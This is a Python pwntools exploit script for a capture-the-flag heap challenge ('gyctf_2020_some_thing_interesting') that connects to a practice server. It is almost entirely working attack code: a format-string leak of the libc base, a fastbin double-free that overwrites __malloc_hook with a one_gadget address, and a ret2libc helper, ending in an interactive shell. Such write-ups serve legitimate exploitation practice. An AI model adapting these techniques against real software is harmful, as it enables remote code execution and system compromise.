from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './gyctf_2020_some_thing_interesting'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27804) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,3,2,4
def add(size1,size2,content1='a',content2='b'):
	sla(':',str(_add))
	sla(':',str(size1))
	sa(':',content1)
	sla(':',str(size2))
	sa(':',content2)

def free(index):
	sla(':',str(_free))
	sla(':',str(index))

def edit(index,content):
	sla(':',str(_edit))
	sla(':',str(index))
	sa(':',content)
	sa(':',content)

def show(index):
	sla(':',str(_show))
	sla(':',str(index))

# start
code = 'OreOOrereOOreO'
sla(':',code+'%17$p')
sla(':','0')
ru(code)
base = int(ru('\n'),16) - 0x20830
leak('base',base)

add(0x60,0x60)
add(0x60,0x60)
free(1)
free(2)
edit(1,p64(base+libc.sym['__malloc_hook']-0x23))
add(0x60,0x60)
add(0x60,0x60)
edit(4,'a'*0x13+p64(base+0xf1147))

sla(':','1')
sla(':',str(0x60))
# end

itr()
